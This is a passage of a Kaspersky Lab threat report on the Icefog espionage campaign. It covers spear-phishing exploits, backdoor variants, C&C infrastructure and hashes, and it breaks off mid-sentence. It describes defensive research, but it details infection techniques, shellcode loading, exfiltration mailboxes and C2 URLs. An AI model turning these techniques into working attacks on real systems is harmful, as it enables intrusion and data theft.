{
    "id": "05367586-9451-440a-b448-6cb58f81f3da",
    "created_at": "2022-10-25T16:48:21.508397Z",
    "updated_at": "2025-03-27T02:11:22.928794Z",
    "deleted_at": null,
    "sha1_hash": "4738dff6abc8e5b93f947a76a63a305bd9d40e0f",
    "title": "",
    "authors": "",
    "file_creation_date": "2013-09-26T14:03:43Z",
    "file_modification_date": "2013-09-26T14:03:52Z",
    "file_size": 4914571,
    "plain_text": "## ►►THE ‘ICEFOG’ APT: A TALE\n# OF CLOAK AND THREE DAGGERS\n\n                                    - “三尖刀” - also known as “three\ndaggers” or “three knives” is an\nancient Chinese weapon.\n\nKASPERSKY LAB GLOBAL RESEARCH\nAND ANALYSIS TEAM (GREAT)\n\nVERSION: 1.00\n\n\n-----\n\nCONTENTS\n\n## ►►CONTENTS\n\n###### EXECUTIVE SUMMARY ��������������������������������������������������������������������������������������������������������3\n\n ATTACK ANALYSIS ��������������������������������������������������������������������������������������������������������������4\n\n>> Spear-phishing attacks - Microsoft Office exploits \b�������������������������������������������������������������������5\n\n>> Spear-phishing attacks - Java exploits\b�����������������������������������������������������������������������������������������9\n\n>> Spear-phishing attacks - HLP vector \b����������������������������������������������������������������������������������������10\n\n>> Spear-phishing attacks - HWP vector\b����������������������������������������������������������������������������������������12\n\n>> Attackers’ “Modus Operandi”\b����������������������������������������������������������������������������������������������������12\n\n>> Backdoor Information\b������������������������������������������������������������������������������������������������������������������13\n\n>> Lateral movement tools: \b������������������������������������������������������������������������������������������������������������22\n\n###### COMMAND AND CONTROL SERVERS ��������������������������������������������������������������������������������24\n\n>> C&C Servers Infrastructure\b��������������������������������������������������������������������������������������������������������25\n\n###### INFECTION DATA AND STATISTICS ������������������������������������������������������������������������������������33\n\n>> Sinkhole Information\b��������������������������������������������������������������������������������������������������������������������34\n\n###### ATTRIBUTION ��������������������������������������������������������������������������������������������������������������������39\n\n MITIGATION INFORMATION ����������������������������������������������������������������������������������������������42\n\n>> Indicators of Compromise (IOCs) \b����������������������������������������������������������������������������������������������42\n\n###### CONCLUSIONS ������������������������������������������������������������������������������������������������������������������49\n\n APPENDIX A ����������������������������������������������������������������������������������������������������������������������51\n\n>> Malware MD5s\b������������������������������������������������������������������������������������������������������������������������������51\n\n###### APPENDIX B ����������������������������������������������������������������������������������������������������������������������54\n\n>> Malware Technical Analysis\b��������������������������������������������������������������������������������������������������������54\n\n###### APPENDIX C ����������������������������������������������������������������������������������������������������������������������60\n\n>> The Icefog-NG Bot Description\b��������������������������������������������������������������������������������������������������60\n\n###### APPENDIX D ����������������������������������������������������������������������������������������������������������������������64\n\n>> The Macfog Bot Description \b������������������������������������������������������������������������������������������������������64\n\n\n-----\n\nEXECUTIVE SUMMARY\n\n## ►►EXECUTIVE SUMMARY\n\n“Icefog” is an Advanced Persistent Threat that has been active since at least 2011, targeting mostly\n\nJapan and South Korea. Known targets include governmental institutions, military contractors,\n\nmaritime and shipbuilding groups, telecom operators, industrial and high-tech companies and\n\nmass media.\n\nThe name “Icefog” comes from a string used in the command-and-control server name in one of the\n\nsamples. The command-and-control software is named “Dagger Three”, in the Chinese language.\n\nThe “Icefog” backdoor set (also known as “Fucobha”) is an interactive espionage tool that is directly\n\ncontrolled by the attackers. There are versions for both Microsoft Windows and Mac OS X. In its latest\n\nincarnation, Icefog doesn’t automatically exfiltrate data, instead, it is operated by the attackers to\n\nperform actions directly on the victim’s live systems.\n\nDuring Icefog attacks, several other malicious tools and backdoors were uploaded to the victims’\n\nmachines, for data exfiltration and lateral movement. This document includes a description\n\nof the backdoors, other malicious tools, together with remediation information. (“Indicators of\n\ncompromise”)\n\n\n-----\n\nATTACK ANALYSIS\n\n## ►►ATTACK ANALYSIS\n\nThe Icefog targeted attacks rely on spear-phishing e-mails that attempt to trick the victim into\n\nopening a malicious attachment or a website.\n\nDuring our investigation, we identified several types of exploits being used through spear-phishing\n\ne-mails against the targets:\n\n[>> CVE-2012-1856 (the “Tran Duy Linh” (also see: http://blog.malwaretracker.com/2013/06/](http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-possible.html)\n\n[tomato-garden-campaign-possible.html) exploit fixed in Microsoft’s MS12-060 security](http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-possible.html)\n\nbulletin)\n\n>> CVE-2012-0158 (the MSCOMCTL.OCX remote code execution vulnerability fixed with\n\nMicrosoft’s MS12-027 security bulletin)\n\n>> Web links to Oracle Java exploits (CVE-2013-0422 and CVE-2012-1723)\n\n>> HLP exploits and abuse of features\n\n>> HWP exploits\n\nThe first two vulnerabilities are exploited through Microsoft Office documents (Word and Excel) that\n\ndrop and execute the backdoor and show a fake “lure” document to the victim. These appear to be\n\nthe most common methods used by the attackers at this moment.\n\n\n-----\n\nAttack Analysis\n\n#### SPEAR-PHISHING ATTACKS - MICROSOFT OFFICE EXPLOITS\n\nThe victim receives an e-mail with an attachment that is either a Word (.doc) or Excel (.xls) file.\n\nEXAMPLE ‘A’\n\nMD5 FILENAME KASPERSKY NAME\n\nb8bed65865ddecbd22efff0970b97321 E-mail message Exploit.MSWord.CVE-20120158.bu\n\n5f1344d8375b449f77d4d8ecfcdeda9a “AKB48 Sashihara Rino Exploit.MSWord.CVE-2012was super cheetah (with 0158.bu\npicture). Doc based on his\nconfession”\n\n9de808b3147ec72468a5aec4b2c38c20 Temporary dropper Backdoor.Win32.CMDer.ct\n\n120f9ed8431a24c14b60003260930c37 wdmaud.drv Backdoor.Win32.CMDer.ct\n\nThe attachment is a standard “Tran Duy Linh” exploit for CVE-2012-1856.\n\nSample Icefog spear-phishing e-mail\n\n|MD5|FILENAME|KASPERSKY NAME|\n|---|---|---|\n|b8bed65865ddecbd22efff0970b97321|E-mail message|Exploit.MSWord.CVE-2012- 0158.bu|\n|5f1344d8375b449f77d4d8ecfcdeda9a|“AKB48 Sashihara Rino was super cheetah (with picture). Doc based on his confession”|Exploit.MSWord.CVE-2012- 0158.bu|\n|9de808b3147ec72468a5aec4b2c38c20|Temporary dropper|Backdoor.Win32.CMDer.ct|\n|120f9ed8431a24c14b60003260930c37|wdmaud.drv|Backdoor.Win32.CMDer.ct|\n\n\n-----\n\nATTACK ANALYSIS\n\nUpon successful execution, the exploit displays a decoy document featuring a picture of a scantily\n\nclad woman:\n\nSample Icefog spear-phishing e-mail\n\nEXAMPLE ‘B’\n\n|MD5|FILENAME|KASPERSKY NAME|\n|---|---|---|\n|32e8d4b2f08aff883c8016b7ebd7c85b|Name varies|Exploit.MSWord.CVE-2012-0158.u|\n|d544a65f0148e59ceca38c579533d040|n/a|Trojan-Downloader.Win32.Agent.wqqz|\n|9a64277e40e3db8659d359126c840897|wdmaud.drv|Trojan-Downloader.Win32.Agent.wqqz|\n\n\n-----\n\nAttack Analysis\n\nUpon successful execution, this shows a clean, fake “lure” document in Japanese titled “Little enthusiasm\nfor regional sovereignty reform”:\n\nSample Icefog spear-phishing e-mail\n\nEXAMPLE ‘C’\n\n|MD5|FILENAME|KASPERSKY NAME|\n|---|---|---|\n|61ed85d28eb18b13223e033a01cb5c05|量産用材料の件.eml / Reviews for mass production material|Exploit.MSWord.CVE-2012- 0158.az|\n|43edcbd20bb5fec2c2d36e7c01d49fc7|20130128.xls|Exploit.MSWord.CVE-2012- 0158.az|\n\n\n-----\n\nATTACK ANALYSIS\n\n\nThis is a business e-mail in Japanese:\n\nThe same malware was used to spear-phish multiple targets in Japan.\nAnother example (d6c90955c6f2a346c9c91be82a1f9d8c) looks like this:\n\n\n-----\n\nAttack Analysis\n\n#### SPEAR-PHISHING ATTACKS - JAVA EXPLOITS\n\nIn addition to Microsoft Office exploits, the Icefog attackers are known to be using Java exploits, hosted\nonline.\n\nFor instance, one of the malicious websites used in the attacks was “money.cnnpolicy.com”. The Java exploit\ndownloaded and executed an Icefog dropper from the following URL:\n\nwww.securimalware[dot]net/info/update.exe\n\nNote: This website is now SINKHOLED by Kaspersky Lab.\n\nThe “update.exe” is a standard Icefog dropper, with the following information:\n\nMD5 COMPILEDON KASPERSKY NAME\n\n78d9ac9954516ac096992cf654caa1fc 2012-07-26 03:10:51 Trojan-Downloader.Win32.Agent.\ngzda\n\nUpon execution, it installs the Icefog malware as “sxs.dll” in the Internet Explorer folder (usually “C:\\\n\nProgram Files\\Internet Explorer”):\n\nMD5 COMPILEDON KASPERSKY NAME\n\n387ae1e56fa48ec50a46394cc51acce7 2012-07-26 03:10:48 Trojan-Downloader.Win32.Agent.\nxsub\n\nTo receive control, the malware DLL (“sxs.dll”) uses a technique known as “DLL search order\n\nhijacking”, which abuses the fact that Internet Explorer will load this file from its own directory,\n\ninstead of the Windows SYSTEM folder.\n\nThe backdoor beams out to the command-and-control server at www.setchon[dot]com/jd/\n\nupload.aspx\n\n|MD5|COMPILEDON|KASPERSKY NAME|\n|---|---|---|\n|78d9ac9954516ac096992cf654caa1fc|2012-07-26 03:10:51|Trojan-Downloader.Win32.Agent. gzda|\n\n|Program Files\\Internet Explorer”):|Col2|Col3|\n|---|---|---|\n|MD5|COMPILEDON|KASPERSKY NAME|\n|387ae1e56fa48ec50a46394cc51acce7|2012-07-26 03:10:48|Trojan-Downloader.Win32.Agent. xsub|\n\n\n-----\n\nATTACK ANALYSIS\n\n#### SPEAR-PHISHING ATTACKS - HLP VECTOR\n\nThe Icefog attackers are also using HLP files to infect their targets. The HLP files do not contain\n\nexploits but they are abusing certain Windows “features” to drop the malware.\n\nIt’s interesting to know that Icefog is not the only crew to heavily use HLP “exploits” as a part of their\n\ntoolkit. Well known, very effective APT like the “Comments Crew” / APT1, have included the HLP\n\ntrick in their kits, along with other lesser known crews.\n\nThis HLP format is an older one, known as “Winhelp”, which was natively supported up until Vista\n\nand Windows 7, when Microsoft shipped a separate Winhlp32.exe component to help phase out\n\nthe technology. Most likely, the choice to abuse Winhelp indicates that the attackers have an idea\n\nof what version operating systems they are attacking.\n\nIn very conservative terms, this implementation of HLP files is not an “exploit”, but instead, abuse\n\nof a poorly constructed Windows Help feature. Code and data is mixed in this file format, and the\n\nIcefog attackers abused it with custom macros.\n\nA fine description of “custom macros” and the risks of building them in to WinHelp projects is\n\nprovided by Ruben Santamarta: http://reversemode.com/index2.php?option=com_content&do_\n\npdf=1&id=4\n\nEXAMPLES\n\nMD5 FILENAME KASPERSKY NAME\n\n0b28d3cc9e89ffe53dbb50f739fcb6e3 Q&A.hlp Exploit.WinHLP.Agent.d\n\n4482fd69a07ab15d9a9d3b3819d048be 츮.hlp Exploit.WinHLP.Agent.d\n\nLet’s take a quick look at an example of how the Icefog attackers abused the provided WinHelp\n\nfunctionality by examining the relevant custom macros, API calls and shellcode.\n\n|MD5|FILENAME|KASPERSKY NAME|\n|---|---|---|\n|0b28d3cc9e89ffe53dbb50f739fcb6e3|Q&A.hlp|Exploit.WinHLP.Agent.d|\n|4482fd69a07ab15d9a9d3b3819d048be|츮.hlp|Exploit.WinHLP.Agent.d|\n\n\n-----\n\nAttack Analysis\n\nThis sample uses standard Win32 API to allocate memory with the execution flag set, copies(using\n\nlong string copy) XOR’ed “shellcode” and calls CreateThread to transfer execution to the malicious\n\npayload.\n\nIn the screenshot above, “RR” means RegisterRoutine.\n\nAfter registration, one can simply call the respective function.\n\nNext, the sample allocates memory with execution flag, and copies XOR’ed “shellcode” . To execute\n\nthe code, a simple call to CreateThread( ) suffices:\n\nThe shellcode is encrypted with a simple 0xBF XOR operation:\n\nUpon execution, the shellcode installs an Icefog backdoor that communicates with the C2s at:\n\n“www.samyongonc[dot]com/jd/upload.aspx” and “www.625tongyi[dot]com/jd/upload.aspx”\n\n\n-----\n\nATTACK ANALYSIS\n\n#### SPEAR-PHISHING ATTACKS - HWP VECTOR\n\nDuring our investigation, we observed Icefog attacks using HWP files. These are document files\n\nused by the Hangul Word Processor. According to Wikipedia, Hangul (also known as Hangul Word\n\n[Processor or HWP) is a proprietary word processing application (link to: http://en.wikipedia.org/](http://en.wikipedia.org/wiki/Hangul_(word_processor))\n\n[wiki/Hangul_(word_processor)) published by the South Korean company Hancom Inc. It is used](http://en.wikipedia.org/wiki/Hangul_(word_processor))\n\nextensively in South Korea, especially in the government sector.\n\nUnfortunately, we were not able to obtain any of these files, although they were used to successfully\n\nattack and infect victims.\n\nUsers of HWP should be aware of these exploits and update their Hangul Word Processor installation\n\nto the most recent version.\n\n#### ATTACKERS’ “MODUS OPERANDI”\n\nThe attack is initiated through spear-phishing e-mails, taking advantage of multiple known (already\n\npatched) vulnerabilities. Once they successfully infect a machine, the operators perform several\n\nbasic functions to identify and confirm the nature of the victim:\n\n>> List folders on disk such as “My Documents” and the Desktop.\n\n>> List adapters and IP configurations.\n\n>> Get information about the victim and their network.\n\nIf the victims looks “genuine” (they avoid working with virtual machines and “fake” victims) they\n\nfurther deploy additional software, including:\n\n>> Type “2” backdoors that use a newer protocol for communication.\n\n>> Lateral movement tools such as:\n\n    - Password and hash dumping tools.\n\n    - Tools to dump Internet Explorer saved passwords.\n\n    - Tools to dump Outlook e-mail accounts and passwords.\n\n    - Debugging tools.\n\n\n-----\n\nAttack Analysis\n\n    - The legitimate “RAR” program to compress stolen data.\n\nWe have documented three main types of stolen data:\n\n>> Windows address books, .WAB files.\n\n>> Documents, including HWP, XLS and DOC files.\n\n>> User account credentials.\n\nIf stolen information represents large files, they are compressed with the popular tool WinRAR (split\n\ninto volumes) or CABARC and transferred to the command-and-control part by part.\n\n#### BACKDOOR INFORMATION\n\nSeveral known variants of the Icefog backdoor are known to exist. We list these as following:\n\n>> The “old” 2011 Icefog — which sends stolen data by e-mail; this version was used against\n\nthe Japanese House of Representatives and the House of Councillors in 2011.\n\n>> Type “1” “normal” Icefog — which interacts with command-and-control servers.\n\n>> Type “2” Icefog — which interacts with a script-based proxy server that redirects commands\n\nfrom the attackers to another machine.\n\n>> Type “3” Icefog — We don’t have a sample of this variant but we observed a certain kind of\n\nC&C that uses a different communication method; we suspect there are victims infected\n\nwith this malware.\n\n>> Type “4” Icefog — same situation as “type 3”.\n\n>> Icefog-NG — which communicates by direct TCP connection to port 5600.\n\n\n-----\n\nATTACK ANALYSIS\n\nTHE OLD “2011” ICEFOG\n\nBack in 2011, we analyzed malware samples that were used to attack several Japanese\n\norganizations. Among of the attacked organizations were the Japanese “House of Representatives”\n\nand the “House of Councilors”.\n\nMD5 COMPILEDON KASPERSKY NAME\n\n6d3d95137ef1ba5c6e15a4a95de8a546 2011-08-05 16:44:30 Trojan-Spy.Win32.Agent.bxeo\n\na72d3774d2d97a7eeb164c6c5768f52a 2011-07-22 20:54:16 Trojan-PSW.Win32.MailStealer.j\n\nBoth samples beacon out to the C&C at “www.cloudsbit.com”, although to different scripts: “/dj/\nupload.aspx” and “/jd2web/upload.aspx”.\n\nIn addition to the normal command-and-control mechanism, these older samples feature another\ncapability, which involves e-mail accounts on AOL.COM:\n\nharrypottercommand001@aol.com\njd2command092@aol.com\njd2clientsend@aol.com\nwoshihero009@aol.com\nmrmylcmd009@aol.com\ndefaultmail002@aol.com\n\nThe malware has the ability to connect to these accounts by POP3 and fetch commands from\nthe mailbox. It also has the ability to send stolen data by e-mail, by contacting smtp.aol.com and\nsending e-mail messages directly.\n\nHere’s what such a session looks like:\n\n|and the “House of Councilors”.|Col2|Col3|\n|---|---|---|\n|MD5|COMPILEDON|KASPERSKY NAME|\n|6d3d95137ef1ba5c6e15a4a95de8a546|2011-08-05 16:44:30|Trojan-Spy.Win32.Agent.bxeo|\n|a72d3774d2d97a7eeb164c6c5768f52a|2011-07-22 20:54:16|Trojan-PSW.Win32.MailStealer.j|\n\n\n-----\n\nAttack Analysis\n\nOne of the samples used in the attacks drops a “lure” photo depicting a Japanese audience:\n\nNote: the faces of the people in the photo above have been blurred in accordance to the\n“Japanese Portrait Rights” (肖像権(しょうぞうけん) regulations\n\nOf the e-mail accounts used by the backdoor, one of them was interesting: woshihero009[at]\naol.com\n\nBack in August 2011, when these attacks took place, this mailbox had several hundred e-mails\nwith stolen information from the victims.\n\n\n-----\n\nATTACK ANALYSIS\n\nInterestingly, their address book contained a number of e-mail addresses to which e-mails were\n\nforwarded and were automatically added to the address book.\n\nNote: More information about the attackers and the older “2011” Icefog incident is available in our\n\nprivate report.\n\nTYPE “1” ICEFOG\n\nMD5 COMPILEDON KASPERSKY NAME\n\n2a106c694660891e0950493e3eedc42d 2013-06-19 12:43:17 Trojan-Downloader.Win32.Agent.\nyium\n\nThe Icefog type “1” backdoor is a remotely controlled Trojan that supports a variety of functions.\n\nVersions of this backdoor are available for Microsoft Windows and Mac OS X.\n\nIt has the ability to:\n\n>> Hijack and upload basic system information to C&C servers owned and controlled by the\n\nattackers.\n\n>> Give the attackers access to push and run commands on the infected system.\n\n>> Steal and upload files from the victims to the command-and-control servers.\n\n>> Download files (tools) from the C&C servers to the infected computers.\n\n>> Give access to the attackers to directly execute SQL commands on any MSSQL servers in\n\nthe network.\n\n_For a technical description of the type “1” Icefog backdoor, see Appendix B._\n\n|MD5|COMPILEDON|KASPERSKY NAME|\n|---|---|---|\n|2a106c694660891e0950493e3eedc42d|2013-06-19 12:43:17|Trojan-Downloader.Win32.Agent. yium|\n\n\n-----\n\nAttack Analysis\n\nTYPE “2” ICEFOG\n\nThe type “2” Icefog backdoor is very similar to type 1. However it uses a proxy server for the\n\ncommands. This behavior relies on a set of ASP scripts, which act as a buffer between the real C&C\n\nbackend and the victim. It offers another level of anonymity to the attackers, as it can be controlled\n\n(for instance) via Tor or another anonymizing method.\n\nWe haven’t observed the use of Type “2” backdoors directly against the victims. Instead, the type\n\n“2” backdoor is used as an upgrade to Type “1” infections, together with a special loader tool.\n\nIt uses a script named “alive.asp” for most of the operations.\n\n(example C&C URL: www.chinauswatch[dot]net/test/space.asp - SINKHOLED by Kaspersky\n\nLab).\n\nIcefog Type “2” C&C scripts\n\n\n-----\n\nATTACK ANALYSIS\n\nType “2” Icefog exists as shellcode files, usually named “msuc.dat”. These are loaded through the\n\nuse of a special tool.\n\nMD5 FILENAME KASPERSKY NAME\n\n324d26f4fb7a91b8019c19e6a0318400 msuc.dat Trojan.Win32.Icefog.a\n\naa97368c43171a5c93c57327d5da04cf msuc.dat Trojan.Win32.Icefog.a\n\nLoaders:\n\nMD5 FILENAME KASPERSKY NAME\n\nd22ab2a2f9e4763a35eb7c6db144d3d4 msld.exe Trojan.Win32.Icefog_loader\n\nffef41bd67de8806ac2d0e10a3cab3c2 暗流服务端代码片调用程 Trojan.Win32.Icefog_loader\n序.exe.jpg (“Undercurrent\nserver code piece calling\nprogram”)\n\nbe043b0d1337f85cfd05f786eaf4f942 通信模块代码片 Trojan.Win32.Icefog_loader\n调用专用.exe.jpg\n(“Communication module\ncode sheet invoking\nspecial.Exe.jpg”)\n\nIn terms of functionality, type “2” Icefog is similar to type “1”. The only difference is that the malware\n\ndoes not have persistence in the system and disappears after reboot.\n\nTYPE “3” AND “4” ICEFOG\n\nAlthough we don’t have samples of these variants, we observed and sinkholed a certain kind of\n\nIcefog-related command-and-controls that use a different communication method; we suspect\n\nthere are victims that are infected with this malware.\n\nType “3” Icefog uses scripts named “view.asp” and “update.asp”. Known C&C URLs:\n\nwww.krentertainly[dot]net/web/view.asp\n\ndisneyland.website.iiswan[dot]com/web/view.asp\n\nType “4” Icefog uses scripts named “upfile.asp”. Known C&C URL:\n\nwww.pinganw[dot]org/sugers/upfile.asp - SINKHOLED by Kaspersky Lab)\n\n|use of a special tool.|Col2|Col3|\n|---|---|---|\n|MD5|FILENAME|KASPERSKY NAME|\n|324d26f4fb7a91b8019c19e6a0318400|msuc.dat|Trojan.Win32.Icefog.a|\n|aa97368c43171a5c93c57327d5da04cf|msuc.dat|Trojan.Win32.Icefog.a|\n\n|Loaders:|Col2|Col3|\n|---|---|---|\n|MD5|FILENAME|KASPERSKY NAME|\n|d22ab2a2f9e4763a35eb7c6db144d3d4|msld.exe|Trojan.Win32.Icefog_loader|\n|ffef41bd67de8806ac2d0e10a3cab3c2|暗流服务端代码片调用程 序.exe.jpg (“Undercurrent server code piece calling program”)|Trojan.Win32.Icefog_loader|\n|be043b0d1337f85cfd05f786eaf4f942|通信模块代码片 调用专用.exe.jpg (“Communication module code sheet invoking special.Exe.jpg”)|Trojan.Win32.Icefog_loader|\n\n\n-----\n\nAttack Analysis\n\nWe continue to look for these variants and will update the paper when or if they are identified.\n\nTYPE “NG” ICEFOG\n\nType “NG” Icefog is the most recent version of this backdoor. It is designed to communicate directly\n\nwith a command-and-control software that runs on Microsoft Windows computers.\n\n_For a thorough technical description of the type “1” Icefog backdoor, see Appendix C._\n\nMACFOG - THE MAC OS X VERSION OF ICEFOG\n\nIn late 2012, the Icefog attackers experimented with a Mac OS X version of Icefog. This particular\n\nversion of the malware was seeded in a number of Chinese BBS forums and masked as a graphic\n\napplication.\n\n[Here is an example: http://bbs.pcbeta.com/forum.php?mod=viewthread&tid=1157944](http://bbs.pcbeta.com/forum.php?mod=viewthread&tid=1157944&page=1#pid30109870\r)\n\n[&page=1#pid30109870](http://bbs.pcbeta.com/forum.php?mod=viewthread&tid=1157944&page=1#pid30109870\r)\n\nOn 19 October 2012, the user “appstoer” advertised an application named “Img2icns.rar”.\n\nThe archive contains a Mac OS X application that drops and installs the Macfog malware. We were\n\nable to find two such archives, but there are probably more.\n\n\n-----\n\nATTACK ANALYSIS\n\nMD5 FILENAME SIZE\n\n126c6b7f5be186fd48bb975f7e59385e Img2icns.zip 5,283,638\n\nff27ebb3696e075e339195a2833caa47 Img2icns.zip 5,285,456\n\nThe malicious modules have the following identification data:\n\nMD5 FILENAME SIZE KASPERSKY NAME\n\ncf1815491d41202eb8647341a8695e1e launchd 32,768 Trojan.OSX.Macfog.a\n\n336de9428650c46b64ff699ab4a441bb launchd 23,084 Trojan.OSX.Macfog.a\n\n9f422bb6c00bb46fbfa3918ae3e9447a Img2icns 23,236 Trojan.OSX.Macfog.a\n\nThe Macfog backdoor is a 64-bit Apple Mac OS X Mach-O executable, compiled with the LLVM Clang\n\npackage. It uses the type “1” C&C servers protocol to communicate and has the same capabilities\n\nas the Windows version. We are including a brief description below; a full description of the malware\n\nis available in Appendix D:\n\nMACFOG: SUMMARY DESCRIPTION\n\nThe Macfog backdoor is very similar to its Win32 siblings. It collects unique system information and\n\nPOSTs this data to a hardcoded URL:\n\nhxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary\n\nname%&filename=%hostname%.jpg\n\n|MD5|FILENAME|SIZE|\n|---|---|---|\n|126c6b7f5be186fd48bb975f7e59385e|Img2icns.zip|5,283,638|\n|ff27ebb3696e075e339195a2833caa47|Img2icns.zip|5,285,456|\n\n|MD5|FILENAME|SIZE|KASPERSKY NAME|\n|---|---|---|---|\n|cf1815491d41202eb8647341a8695e1e|launchd|32,768|Trojan.OSX.Macfog.a|\n|336de9428650c46b64ff699ab4a441bb|launchd|23,084|Trojan.OSX.Macfog.a|\n|9f422bb6c00bb46fbfa3918ae3e9447a|Img2icns|23,236|Trojan.OSX.Macfog.a|\n\n\n-----\n\nAttack Analysis\n\nThe backdoor is capable of familiar functionalities: system information collection, communication\n\nover HTTP with the C&C, download and upload files and execute system commands.\n\nMacfog C&C configuration data\n\nThe Macfog backdoor is different from the Windows variant from the point of view of usage by the\n\nattackers. So far, we haven’t identified victims of targeted attacks being infected with it, although\n\nwe do believe they exist. The seeding of this version through Chinese bulletin boards resulted in a\n\nfew hundred infections worldwide. We believe this could have been a beta-testing phase for Mac\n\nOS X versions to be used in targeted attacks later.\n\n\n-----\n\nATTACK ANALYSIS\n\n#### LATERAL MOVEMENT TOOLS:\n\nThe attackers rely on a multitude of lateral movement tools that are deployed to the victims through\n\nthe command-and-control servers. The tools we observed cover a variety of functions, such as\n\ndumping Windows user credentials, Outlook and Internet Explorer saved passwords, and the\n\ngathering of system information.\n\nOne of the servers we analyzed had an open folder where some of the filenames of the lateral\n\nmovement tools were still visible, although most were truncated to 0 by the C&C upon successful\n\nexecution on the victim:\n\nFolder with lateral movement tools on a command-and-control server\n\nA description of some of the tools we observed follows:\n\n\n95ee545a6562a81c3e049a48c5b9f8aa freespi.cab.cab Small tool which lists and deletes\nWinsock providers. Icefog uses\nWinsock providers for persistence,\nso it is used by the attackers during\nupgrade to a newer version of the\nmalware.\n\n|MD5|FILENAME|DESCRIPTION|\n|---|---|---|\n|d53cec579c7b3b3e0f77cd64e0c58bbf|console.exe.jpg|Server backend of Icefog-NG|\n|00c3d59a83c3745498b75fd9d1067b4c|Dbgview.exe.jpg|Sysinternals’s Dbgview|\n|9d3d8504cd488acaa731cfdd48fe5851-|hush获取.exe.jpg|Known Windows hashes dumping tool “quarks-pwdump.exe”|\n|ffef41bd67de8806ac2d0e10a3cab3c2|暗流服务端代码 片调用程序.exe. jpg (“Undercurrent server code piece calling program”)|Loader for type “2” Icefog|\n|be043b0d1337f85cfd05f786eaf4f942|通信模块代码片 调用专用.exe.jpg (“Communication module code sheet invoking special. Exe.jpg”)|Loader for type “2” Icefog|\n|95ee545a6562a81c3e049a48c5b9f8aa|freespi.cab.cab|Small tool which lists and deletes Winsock providers. Icefog uses Winsock providers for persistence, so it is used by the attackers during upgrade to a newer version of the malware.|\n\n\n-----\n\nAttack Analysis\n\nIn addition to these, several other tools were observed but not recovered. For instance, on one of\n\nthe victim machines, we observed what appeared to be the use of a Kernel exploit through a Java\n\napplication for escalation of privileges. Unfortunately, we do not know if it was a zero-day kernel\n\nvulnerability because the file was deleted by the attackers after being used.\n\n\n-----\n\nCOMMAND AND CONTROL SERVERS\n\n## ►►COMMAND AND CONTROL\n### SERVERS\n\nDuring our research, we observed multiple Icefog command and control servers. Most of them\n\nwere on shared hosting platforms, however, some of them, which were of greater importance to the\n\nattackers, were also using dedicated hosting.\n\nPerhaps one of the most important aspects\n\nof the Icefog C&Cs is the “hit and run” nature.\n\nThe attackers would set up a C&C, create a\n\nmalware sample that uses it, attack the victim,\n\ninfect it, and communicate with the victim\n\nmachine before moving on. The shared hosting\n\nwould expire in a month or two and the C&C\n\ndisappears.\n\nThe nature of the attacks was also very focused\n\n- in many cases, the attackers already knew\n\nwhat they were looking for. The filenames were\n\nquickly identified, archived, transferred to the\n\nC&C and then the victim was abandoned.\n\nBased on the C&C names, we were able to\n\nidentify several Icefog campaigns that were\n\nactive between 2011-2013.\n\nFrom the timeline above, it seems the attackers\n\nincreased the number of campaigns in 2013\n\ncompared to previous years, although it’s\n\npossible that malware and artifacts used in\n\nearlier years are no longer available. Hence, the\n\nchart probably represents only a fraction of the\n\nattackers’ activity during the past years.\n\n\n-----\n\nCommand and Control servers\n\n#### C&C SERVERS INFRASTRUCTURE\n\nWe identified four types of Icefog C&C servers - type “1”, “2”, “3” and type “4”. Also, there is a fifth,\n\nstandalone type of C&C, used for Icefog-NG, which runs as a Windows desktop application.\n\nThe type “1” C&C server uses a full web backend that lets the attacker directly control the victims\n\nvia a web browser. The type “1” C2 backend is written in ASP.NET.\n\nThe type “2” C&C server backend we identified acts as a virtual, custom proxy between the attackers\n\nand the victims. It is written in ASP and is extremely simplistic in operation. This is more effective as\n\nit conceals the attacker’s identity. The second type of C2 works in conjunction with a control tool,\n\nprobably running directly on the attacker’s PC.\n\nThe type “3” C&C server (used in the “starwings” and “disneyland” campaigns) appears to be\n\nexperimental and features only two basic functions: view and update. Its exact workings are unknown\n\nand we haven’t been able to locate the Icefog malware that uses it.\n\nThe type “4” C&C server was identified through sinkholing of the domain “pinganw[dot]org”. (known\n\nC2 URL - www.pinganw[dot]org/sugers/upfile.asp). Just like type “3”, the exact workings are\n\nunknown and we haven’t been able to locate the Icefog malware that uses it.\n\nThe Icefog-NG C&C server is a Windows desktop application which doesn’t require a web server and\n\nworks as a standalone TCP server, which by default listens on port 5600.\n\nOur analysis focuses on type “1” C&C servers, which are the most popular and have been used in\n\nmost of the attacks we observed.\n\n\n-----\n\nCOMMAND AND CONTROL SERVERS\n\nHere’s a look at the type “1” command-and-control server login screen:\n\nThe command-and-control script (“control.aspx”) features an interesting comment\n\n“shiyanlllllllllllllllllllllllllll”. The page title is “尖刀三号”, which means “Dagger Three” in Chinese.\n\n\n-----\n\nCommand and Control servers\n\nFor martial arts fans, the “尖刀三号” is quite similar to “三尖刀”, which is an ancient Chinese weapon.\n\nThe Type “1” C2 interface is written in ASP.NET and features an easy to use interface to communicate\n\nwith and manage the victims:\n\nThe “ManageSystem” C&C user interface (type “1”)\n\nThis control panel is actually a Visual Basic.NET web application with the following structure:\n\n\n-----\n\nCOMMAND AND CONTROL SERVERS\n\nThe application uses the native filesystem as the main storage to save stolen data, logs and\n\ntemporary files. Below is short description of directories used by the C&C application:\n\nok: “heartbeat” files with dates that indicate the last time a victim\nwas online.\n\ndownloads: files that were transferred from the victim at the request of the\noperator.\n\nuploads: files that should be pushed to the victim systems.\n\norder: files containing instructions or commands that are to be\nexecuted on the victims’ machines.\n\nresult: The result of command execution on the victims’ machines.\n\ninfo: basic information about the victims’ systems.\n\nlogs: operator interaction logs, can be erased on request by the\noperator.\n\nfiles: additional files, including JavaScript, CSS and images used by\nControl Panel web user interface.\n\nPerhaps the most interesting part is that the type “1” C&C panel maintains a full history of the\n\nattacker’s interaction with the victims. This is kept as an encrypted logfile, in the “logs” directory\n\non the server. In addition to that, the server maintains full interaction logs and command execution\n\nresults from each victim.\n\n\n-----\n\nCommand and Control servers\n\nBelow we can see an example of the attackers copying a number of files to “c:\\temp\\mslog” from\n\nan USB flash drive connected to the computer with Korean Windows systems and preparing them\n\nfor upload to the C2:\n\nIn another example, we can see them uploading and running a type “2” backdoor on top of the type\n\n“1” infection:\n\n\n-----\n\nCOMMAND AND CONTROL SERVERS\n\nInterestingly, the modern Icefog-NG C&C application looks very similar to Icefog Web UI - it uses\n\nthe same multi-tab layout and even has the same tab titles. We believe that 